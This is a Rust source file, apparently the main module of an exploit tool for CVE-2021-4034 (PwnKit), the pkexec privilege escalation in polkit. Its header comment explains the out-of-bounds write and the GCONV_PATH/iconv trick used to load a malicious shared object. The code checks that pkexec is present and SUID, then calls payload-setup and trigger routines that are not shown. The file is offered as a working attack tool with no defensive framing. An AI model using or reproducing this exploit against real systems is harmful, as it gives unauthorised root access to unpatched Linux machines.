//! CVE-2021-4034: PwnKit (pkexec Local Privilege Escalation)
//!
//! This exploits an out-of-bounds write in polkit's pkexec.
//! When argc=0, pkexec reads argv[0] which is actually envp[0],
//! then overwrites it with the full path, creating a new env var.
//!
//! The bypass leverages:
//! 1. AT_SECURE filters env vars at load time, not runtime
//! 2. PATH=GCONV_PATH=. looks like PATH to ld.so
//! 3. After pkexec's OOB write, GCONV_PATH=./pwnkit appears
//! 4. When pkexec calls g_printerr, iconv reads GCONV_PATH
//! 5. iconv loads our malicious .so
//!
//! Target: polkit < 0.120 (Jan 2022 patch)

mod payload;
mod trigger;

use log::{info, error};

pub struct Exploit;

impl Exploit {
    pub fn new() -> Self { Self }

    fn check_pkexec_exists() -> bool {
        // Check common paths
        std::path::Path::new("/usr/bin/pkexec").exists() ||
        std::path::Path::new("/usr/local/bin/pkexec").exists()
    }

    fn get_pkexec_path() -> Option<&'static str> {
        if std::path::Path::new("/usr/bin/pkexec").exists() {
            Some("/usr/bin/pkexec")
        } else if std::path::Path::new("/usr/local/bin/pkexec").exists() {
            Some("/usr/local/bin/pkexec")
        } else {
            None
        }
    }

    fn check_vulnerable() -> Result<(), String> {
        if !Self::check_pkexec_exists() {
            return Err("pkexec not found".into());
        }

        // Check SUID bit
        use std::os::unix::fs::MetadataExt;
        let path = Self::get_pkexec_path().unwrap();
        let meta = std::fs::metadata(path)
            .map_err(|e| format!("stat pkexec: {}", e))?;
        
        if meta.mode() & 0o4000 == 0 {
            return Err("pkexec not SUID".into());
        }

        Ok(())
    }

    pub fn run(&self) -> Result<(), String> {
        info!("[PwnKit] CVE-2021-4034 Privilege Escalation");

        Self::check_vulnerable()?;

        info!("[PwnKit] Setting up payload directory...");
        if let Err(e) = payload::setup() {
            payload::cleanup();
            return Err(e);
        }

        info!("[PwnKit] Triggering exploit...");
        if let Err(e) = trigger::execute() {
            payload::cleanup();
            return Err(e);
        }

        // If we return here, the exploit failed
        payload::cleanup();
        Err("Exploit returned unexpectedly".into())
    }
}

